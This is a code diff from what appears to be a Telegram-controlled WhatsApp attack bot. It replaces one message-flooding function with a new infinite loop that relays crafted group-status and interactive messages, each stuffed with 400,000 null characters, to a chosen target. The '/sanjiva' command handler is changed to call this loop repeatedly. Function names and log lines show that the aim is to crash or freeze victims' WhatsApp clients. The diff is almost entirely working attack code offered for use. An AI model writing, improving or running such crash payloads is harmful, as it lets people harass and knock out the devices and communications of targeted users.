@@ -517,10 +517,38 @@ async function VnXDelayXFcNew(sock, target) {
   }, { participant: { jid: target } });
 }
 
-async function VisiNoob(sock, target) {
-  for (let i = 0; i < 50; i++) {
-    await sock.sendMessage(target, { text: "\u200e".repeat(600000) });
-  }
+async function delaynewinvisibleVnX(sock, target) {
+  while (true) {
+    try {   
+      const MsgNew = {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {                     
+              body: {
+                text: "VnXNgelay",
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "galaxy_message",
+                paramsJson: "\u0000".repeat(400000),
+                version: 3
+              },
+              entryPointConversionSource: "call_permission_request"
+            }
+          }
+        }
+      };
+
+      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
+      
+      console.log(` VnX Sent to ${target}`);
+      await new Promise(resolve => setTimeout(resolve, 1200));
+
+    } catch (e) {
+      console.log("Error:", e);
+      await new Promise(resolve => setTimeout(resolve, 5000));
+    }
+  }
 }
 
 // ================= HELPER FUNCTIONS ================= //
@@ -815,11 +843,11 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await VsxCrashDelay(sock, target);
-    await sleep(500);
-    await DelayHard(sock, target);
-    
-    console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
+    for (let i = 0; i < 7; i++) {
+      await delaynewinvisibleVnX(sock, target);
+      await sleep(3);
+      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
+    }
     
   } catch (error) {
     console.error("Error in sanjiva:", error);
